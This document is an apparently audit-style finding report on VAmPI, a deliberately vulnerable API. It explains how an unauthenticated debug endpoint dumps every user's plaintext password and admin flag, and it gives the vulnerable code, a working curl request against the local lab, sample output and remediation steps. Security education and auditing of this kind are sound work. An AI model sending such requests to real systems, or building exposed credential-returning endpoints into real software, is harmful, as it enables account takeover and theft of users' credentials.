# H3 - Debug Endpoint Exposes All User Data Including Passwords: PoC

- **ID**: H3
- **Severity**: High
- **PoC-Status**: theoretical
- **Affected endpoint**: `GET /users/v1/_debug`
- **Authentication required**: None

## Vulnerability

`api_views/users.py:24-26` registers an unauthenticated route that calls
`User.get_all_users_debug()` (`models/user_model.py:66-67`). That method iterates
every row in the `users` table and returns `username`, `password` (plaintext),
`email`, and `admin` flag via `json_debug()` (`user_model.py:58-59`). No
token validation or authorization check exists anywhere in the call chain.

```python
# api_views/users.py:24-26
def debug():
    return_value = jsonify({'users': User.get_all_users_debug()})
    return return_value

# models/user_model.py:58-59, 66-67
def json_debug(self):
    return {'username': self.username, 'password': self.password,
            'email': self.email, 'admin': self.admin}

@staticmethod
def get_all_users_debug():
    return [User.json_debug(user) for user in User.query.all()]
```

The route binding is declared in `openapi_specs/openapi3.yml:88-94`:
```yaml
/users/v1/_debug:
  get:
    operationId: api_views.users.debug
```

## Exploit

Start the vulnerable image:

```bash
docker compose up vampi-vulnerable   # binds 0.0.0.0:5002 -> container:5000
```

Single unauthenticated request dumps all credentials:

```bash
curl -s http://localhost:5002/users/v1/_debug | python3 -m json.tool
```

Expected response (seeded data from `user_model.py:99-101`):

```json
{
  "users": [
    {"username": "name1", "password": "pass1", "email": "mail1@mail.com", "admin": false},
    {"username": "name2", "password": "pass2", "email": "mail2@mail.com", "admin": false},
    {"username": "admin", "password": "pass1", "email": "admin@mail.com", "admin": true}
  ]
}
```

No token, no session cookie, no API key. One GET request yields every user's
plaintext password and which accounts hold admin privileges.

## Impact

An anonymous internet attacker can:

1. Retrieve every registered user's plaintext password in a single request.
2. Identify all admin accounts by `"admin": true`.
3. Use harvested credentials to log in as any user, including administrators
   (`POST /users/v1/login`), gaining full authenticated access to the API.

Combined with H4 (passwords stored in plaintext), there is no hashing layer to
slow down offline cracking; credentials are immediately usable.

## Remediation

- Remove the `/users/v1/_debug` route entirely before any production deployment.
- If a debug endpoint is required internally, gate it behind a server-side
  admin check and never expose it on a public-facing port.
- Enforce authentication middleware at the Connexion/OpenAPI layer so that
  any accidentally exposed route still requires a valid token by default.
